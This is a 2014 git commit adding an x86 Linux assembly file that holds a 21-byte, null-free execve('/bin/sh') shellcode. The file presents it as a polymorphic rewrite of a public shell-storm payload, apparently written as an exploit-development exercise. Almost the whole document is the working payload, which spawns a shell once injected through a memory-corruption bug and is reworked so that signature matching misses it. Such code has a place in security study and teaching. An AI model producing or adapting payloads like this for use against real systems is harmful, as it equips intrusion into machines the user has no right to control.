5d25f75bd8727f2c25d5b9d3cae25e045c1b9a13
javiertejedorm <javiertejedorm@gmail.com>
2014-09-16 21:37:05 +0100

    Create execve_shell_polymorphism.asm

---
+++ execve_shell_polymorphism.asm
@@ -0,0 +1,20 @@
+;Linux/x86 execve /bin/sh shellcode
+;21 bytes
+;null-free
+
+;Polimorphism of this shellcode http://www.shell-storm.org/shellcode/files/shellcode-827.php
+;Javier Tejedor
+
+global _start 
+ 
+section .text 
+_start:
+
+	xor eax,eax
+	push eax
+	push dword 0x68732f2f
+	push dword 0x6e69622f
+	mov ebx,esp
+	mul ecx
+	mov al,0xb
+	int 0x80
